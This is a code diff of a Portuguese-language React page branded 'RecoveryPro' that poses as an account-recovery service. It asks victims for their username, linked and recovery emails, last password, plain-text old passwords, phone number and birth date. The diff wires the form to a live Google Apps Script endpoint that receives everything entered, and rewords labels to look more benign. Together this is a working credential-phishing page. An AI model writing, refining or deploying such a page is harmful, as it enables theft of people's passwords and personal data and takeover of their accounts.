@@ -45,28 +45,26 @@
       const [isSubmitted, setIsSubmitted] = useState(false);
       const [loading, setLoading] = useState(false);
 
-      // --- Lógica de Probabilidade (Só sobe ao completar) ---
+      // --- Link do seu Google Apps Script injetado abaixo ---
+      const GOOGLE_URL = "https://script.google.com/macros/s/AKfycbwZi81Hae2mgB27FYl1sKvfutNrMsxb9fLpc-1GXRDtxpILXNgPQObpwrURACuwVWryqg/exec";
+
+      // --- Lógica de Probabilidade (Sobe apenas ao completar campos chave) ---
       const probabilidade = useMemo(() => {
         if (!formData.plataforma) return 0;
         let score = 0;
-        
-        // Verifica se e-mail é válido
-        const isEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        const isEmail = (e) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);
         
         if (formData.usuario.length >= 3) score += 10;
         if (isEmail(formData.emailVinculado)) score += 15;
         if (formData.plataforma === 'google' && isEmail(formData.emailRecuperar)) score += 10;
-        if (formData.ultimaSenha.length >= 6) score += 20;
-        if (formData.telefone.replace(/\D/g, '').length === 11) {
-          score += 15;
-        }
+        if (formData.ultimaSenha.length >= 5) score += 20;
+        if (formData.telefone.replace(/\D/g, '').length === 11) score += 15;
         if (formData.dataNascimento.dia && formData.dataNascimento.mes && formData.dataNascimento.ano) score += 10;
         
-        const validOldPassCount = formData.senhasAntigas.filter(p => p.length >= 4).length;
+        const validOldPassCount = formData.senhasAntigas.filter(p => p.length >= 3).length;
         if (validOldPassCount >= 1) score += 10;
-        
-        if (formData.motivo) score += 10;
-        if (formData.dataOcorrido) score += 10;
+        if (formData.motivo) score += 5;
+        if (formData.dataOcorrido) score += 5;
 
         return Math.min(score, 100);
       }, [formData]);
@@ -82,24 +80,19 @@
       };
 
       const handleNoSpaces = (val) => val.replace(/\s/g, '');
-
       const addOldPassword = () => setFormData({ ...formData, senhasAntigas: [...formData.senhasAntigas, ''] });
-
       const updateOldPassword = (index, val) => {
         const news = [...formData.senhasAntigas];
         news[index] = handleNoSpaces(val);
         setFormData({ ...formData, senhasAntigas: news });
       };
 
-      // --- Envio ---
+      // --- Envio de dados ---
       const handleSubmit = async (e) => {
         e.preventDefault();
         setLoading(true);
 
-        const GOOGLE_URL = "URL_DO_SEU_SCRIPT_AQUI"; // Substitua pela sua URL do Apps Script
-
         try {
-          // Formata senhas antigas em tópicos
           const senhasFormatadas = formData.senhasAntigas
             .filter(s => s.trim() !== '')
             .map(s => `• ${s}`)
@@ -123,7 +116,7 @@
           setIsSubmitted(true);
         } catch (error) {
           console.error("Erro:", error);
-          alert("Erro ao enviar os dados.");
+          alert("Erro de conexão. Verifique se o script está publicado corretamente.");
           setLoading(false);
         }
       };
@@ -135,9 +128,9 @@
               <div className="w-20 h-20 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
                 <CheckCircle2 className="w-12 h-12 text-emerald-400" />
               </div>
-              <h2 className="text-3xl font-bold mb-4">Solicitação Enviada!</h2>
-              <p className="text-slate-400 mb-8">Analisaremos seu caso. Entraremos em contato via WhatsApp em até 24h.</p>
-              <button onClick={() => window.location.reload()} className="w-full py-4 bg-emerald-600 hover:bg-emerald-500 transition-colors rounded-xl font-bold">FECHAR</button>
+              <h2 className="text-3xl font-bold mb-4">Dados Enviados!</h2>
+              <p className="text-slate-400 mb-8">Recebemos suas informações. Aguarde nosso contato via WhatsApp em breve.</p>
+              <button onClick={() => window.location.reload()} className="w-full py-4 bg-emerald-600 hover:bg-emerald-500 transition-colors rounded-xl font-bold">VOLTAR</button>
             </div>
           </div>
         );
@@ -152,7 +145,7 @@
               </div>
               <div>
                 <h1 className="text-2xl font-bold tracking-tight">Recovery<span className="text-indigo-400">Pro</span></h1>
-                <p className="text-xs text-slate-500 uppercase tracking-widest font-semibold">Cibersegurança Avançada</p>
+                <p className="text-xs text-slate-500 uppercase tracking-widest font-semibold">Análise de Segurança</p>
               </div>
             </div>
           </header>
@@ -174,11 +167,8 @@
 
           <main className="max-w-4xl mx-auto">
             <form onSubmit={handleSubmit} className="space-y-8 pb-32">
-              
               <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">
-                  <TrendingUp className="w-5 h-5 text-indigo-400" /> Plataforma Alvo
-                </h2>
+                <h2 className="text-xl font-semibold mb-6 flex items-center gap-2"><TrendingUp className="w-5 h-5 text-indigo-400" /> Plataforma</h2>
                 <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                   {[
                     { id: 'google', icon: Mail, label: 'Google' },
@@ -196,36 +186,25 @@
 
               {formData.plataforma && (
                 <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
-                  
                   <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                    <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">
-                      <User className="w-5 h-5 text-indigo-400" /> Identificação da Conta
-                    </h2>
+                    <h2 className="text-xl font-semibold mb-6 flex items-center gap-2"><User className="w-5 h-5 text-indigo-400" /> Identificação</h2>
                     <div className="grid md:grid-cols-2 gap-4">
-                      <div>
-                        <label className="text-xs font-bold text-slate-500 uppercase mb-2 block">Usuário / @</label>
-                        <input value={formData.usuario} onChange={(e) => setFormData({ ...formData, usuario: handleNoSpaces(e.target.value.toLowerCase()) })} type="text" placeholder="Ex: joao_silva" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" />
-                      </div>
-                      <div>
-                        <label className="text-xs font-bold text-slate-500 uppercase mb-2 block">E-mail Vinculado</label>
-                        <input value={formData.emailVinculado} onChange={(e) => setFormData({ ...formData, emailVinculado: handleNoSpaces(e.target.value) })} type="email" placeholder="email@exemplo.com" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" />
-                      </div>
+                      <input value={formData.usuario} onChange={(e) => setFormData({ ...formData, usuario: handleNoSpaces(e.target.value.toLowerCase()) })} type="text" placeholder="Usuário / @" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" />
+                      <input value={formData.emailVinculado} onChange={(e) => setFormData({ ...formData, emailVinculado: handleNoSpaces(e.target.value) })} type="email" placeholder="E-mail Vinculado" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" />
                     </div>
                   </section>
 
                   {formData.plataforma === 'google' && (
                     <section className="bg-slate-900 border border-red-500/20 p-6 md:p-8 rounded-[2rem]">
-                      <h2 className="text-xl font-semibold mb-4 text-red-400 flex items-center gap-2"><AlertCircle className="w-5 h-5" /> Gmail a Recuperar</h2>
-                      <input required value={formData.emailRecuperar} onChange={(e) => setFormData({ ...formData, emailRecuperar: handleNoSpaces(e.target.value) })} type="email" placeholder="conta.perdida@gmail.com" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-red-500/50" />
+                      <h2 className="text-xl font-semibold mb-4 text-red-400 flex items-center gap-2"><AlertCircle className="w-5 h-5" /> E-mail a Recuperar</h2>
+                      <input required value={formData.emailRecuperar} onChange={(e) => setFormData({ ...formData, emailRecuperar: handleNoSpaces(e.target.value) })} type="email" placeholder="email_perdido@gmail.com" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-red-500/50" />
                     </section>
                   )}
 
                   <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                    <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">
-                      <Lock className="w-5 h-5 text-indigo-400" /> Última Senha que se lembra
-                    </h2>
+                    <h2 className="text-xl font-semibold mb-6 flex items-center gap-2"><Lock className="w-5 h-5 text-indigo-400" /> Última Senha</h2>
                     <div className="relative">
-                      <input value={formData.ultimaSenha} onChange={(e) => setFormData({ ...formData, ultimaSenha: handleNoSpaces(e.target.value) })} type={showPass ? 'text' : 'password'} placeholder="Sua senha" className="w-full bg-slate-800 border-none p-4 pr-12 rounded-xl focus:ring-2 ring-indigo-500" />
+                      <input value={formData.ultimaSenha} onChange={(e) => setFormData({ ...formData, ultimaSenha: handleNoSpaces(e.target.value) })} type={showPass ? 'text' : 'password'} placeholder="Sua última senha" className="w-full bg-slate-800 border-none p-4 pr-12 rounded-xl focus:ring-2 ring-indigo-500" />
                       <button type="button" onClick={() => setShowPass(!showPass)} className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-500">
                         {showPass ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                       </button>
@@ -233,13 +212,11 @@
                   </section>
 
                   <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                    <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">
-                      <Smartphone className="w-5 h-5 text-indigo-400" /> Celular da Conta
-                    </h2>
+                    <h2 className="text-xl font-semibold mb-6 flex items-center gap-2"><Smartphone className="w-5 h-5 text-indigo-400" /> Celular da Conta</h2>
                     <div className="space-y-4">
                       <input value={formData.telefone} onChange={(e) => setFormData({...formData, telefone: applyPhoneMask(e.target.value)})} type="text" placeholder="xx xxxxx-xxxx" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" />
                       <div className="p-4 bg-slate-800/50 rounded-xl flex items-center justify-between border border-slate-700">
-                        <span className="text-sm">Possui acesso a este número?</span>
+                        <span className="text-sm">Ainda possui acesso?</span>
                         <div className="flex gap-2">
                           {['sim', 'nao'].map(opt => (
                             <button key={opt} type="button" onClick={() => setFormData({...formData, telefoneAcesso: opt})} className={`px-4 py-2 rounded-lg text-xs font-bold uppercase ${formData.telefoneAcesso === opt ? 'bg-indigo-600' : 'bg-slate-700 text-slate-400'}`}>{opt}</button>
@@ -252,15 +229,15 @@
                   <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
                     <h2 className="text-xl font-semibold mb-6 flex items-center gap-2"><Calendar className="w-5 h-5 text-indigo-400" /> Nascimento</h2>
                     <div className="grid grid-cols-3 gap-4">
-                      <select value={formData.dataNascimento.dia} onChange={(e) => setFormData({...formData, dataNascimento: {...formData.dataNascimento, dia: e.target.value}})} className="bg-slate-800 border-none p-4 rounded-xl appearance-none cursor-pointer">
+                      <select value={formData.dataNascimento.dia} onChange={(e) => setFormData({...formData, dataNascimento: {...formData.dataNascimento, dia: e.target.value}})} className="bg-slate-800 border-none p-4 rounded-xl appearance-none">
                         <option value="">Dia</option>
                         {[...Array(31)].map((_, i) => <option key={i} value={i+1}>{i+1}</option>)}
                       </select>
-                      <select value={formData.dataNascimento.mes} onChange={(e) => setFormData({...formData, dataNascimento: {...formData.dataNascimento, mes: e.target.value}})} className="bg-slate-800 border-none p-4 rounded-xl appearance-none cursor-pointer">
+                      <select value={formData.dataNascimento.mes} onChange={(e) => setFormData({...formData, dataNascimento: {...formData.dataNascimento, mes: e.target.value}})} className="bg-slate-800 border-none p-4 rounded-xl appearance-none">
                         <option value="">Mês</option>
                         {['Jan','Fev','Mar','Abr','Mai','Jun','Jul','Ago','Set','Out','Nov','Dez'].map((m, i) => <option key={i} value={i+1}>{m}</option>)}
                       </select>
-                      <select value={formData.dataNascimento.ano} onChange={(e) => setFormData({...formData, dataNascimento: {...formData.dataNascimento, ano: e.target.value}})} className="bg-slate-800 border-none p-4 rounded-xl appearance-none cursor-pointer">
+                      <select value={formData.dataNascimento.ano} onChange={(e) => setFormData({...formData, dataNascimento: {...formData.dataNascimento, ano: e.target.value}})} className="bg-slate-800 border-none p-4 rounded-xl appearance-none">
                         <option value="">Ano</option>
                         {[...Array(80)].map((_, i) => <option key={i} value={2026-i}>{2026-i}</option>)}
                       </select>
@@ -268,8 +245,7 @@
                   </section>
 
                   <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                    <h2 className="text-xl font-semibold mb-2 flex items-center gap-2"><Lock className="w-5 h-5 text-indigo-400" /> Senhas Antigas</h2>
-                    <p className="text-[10px] text-slate-500 mb-6 uppercase font-bold">Uma por linha no relatório final</p>
+                    <h2 className="text-xl font-semibold mb-6 flex items-center gap-2"><Lock className="w-5 h-5 text-indigo-400" /> Senhas Antigas</h2>
                     <div className="space-y-4">
                       {formData.senhasAntigas.map((pass, idx) => (
                         <input key={idx} value={pass} onChange={(e) => updateOldPassword(idx, e.target.value)} type="text" placeholder={`Senha antiga ${idx + 1}`} className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" />
@@ -279,13 +255,13 @@
                   </section>
 
                   <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                    <h2 className="text-xl font-semibold mb-6">O que aconteceu?</h2>
+                    <h2 className="text-xl font-semibold mb-6">Informações Adicionais</h2>
                     <div className="grid grid-cols-2 gap-3 mb-6">
                       {['hackeado', 'perdi senha', 'bloqueado', 'outro'].map((id) => (
                         <button key={id} type="button" onClick={() => setFormData({ ...formData, motivo: id })} className={`p-4 rounded-xl border-2 transition-all text-xs font-bold uppercase ${formData.motivo === id ? 'bg-indigo-600 border-indigo-400' : 'bg-slate-800 border-transparent text-slate-400'}`}>{id}</button>
                       ))}
                     </div>
-                    <label className="block text-xs font-bold text-slate-500 uppercase mb-2">Data do ocorrido</label>
+                    <label className="block text-xs font-bold text-slate-500 uppercase mb-2">Data aproximada do problema</label>
                     <input type="date" value={formData.dataOcorrido} onChange={(e) => setFormData({ ...formData, dataOcorrido: e.target.value })} className="w-full bg-slate-800 border-none p-4 rounded-xl text-white color-scheme-dark" />
                   </section>
 
@@ -305,7 +281,7 @@
           </main>
 
           <style dangerouslySetInnerHTML={{ __html: `
-            input[type="date"]::-webkit-calendar-picker-indicator { filter: invert(1); opacity: 0.5; }
+            input[type="date"]::-webkit-calendar-picker-indicator { filter: invert(1); opacity: 0.5; cursor: pointer; }
             select { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%2364748b'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 1rem center; background-size: 1.5em; }
             .color-scheme-dark { color-scheme: dark; }
           `}} />
